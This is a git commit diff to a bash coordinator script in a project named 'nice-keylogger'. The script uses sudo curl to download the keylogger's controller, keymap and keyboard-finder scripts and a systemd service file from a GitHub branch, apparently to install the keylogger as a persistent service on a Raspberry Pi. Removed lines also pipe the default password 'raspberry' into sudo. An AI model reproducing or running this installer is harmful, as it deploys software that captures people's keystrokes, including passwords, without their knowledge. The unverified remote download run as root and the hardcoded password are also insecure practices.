b9916d91051b85a5164ad77dcc8cbefc6a5f7366
Sam Castle <castles2@vcu.edu>
2023-04-18 19:54:20 -0400

    testing no conditionals

--- src/coordinator.sh
+++ src/coordinator.sh
@@ -21,18 +21,10 @@ FKEY=find_keyboard.py
 KLSERV=nicekeylogger.service
 # TODO correct this url to be the main branch
 base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
-if ! test -f "$CONT" ; then
-  echo raspberry | sudo -S curl $base\controller.py > controller.py
-fi
-if ! test -f "$KMAP" ; then
-  sudo curl $base\keymap.py > keymap.py
-fi
-if ! test -f "$FKEY" ; then
-  sudo curl $base\find_keyboard.py > find_keyboard.py
-fi
-if ! test -f "$KLSERV" ; then
-  sudo curl $base\nicekeylogger.service > nicekeylogger.service
-fi
+sudo curl $base\controller.py > controller.py
+sudo curl $base\keymap.py > keymap.py
+sudo curl $base\find_keyboard.py > find_keyboard.py
+sudo curl $base\nicekeylogger.service > nicekeylogger.service
 sudo chmod 744 test/controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
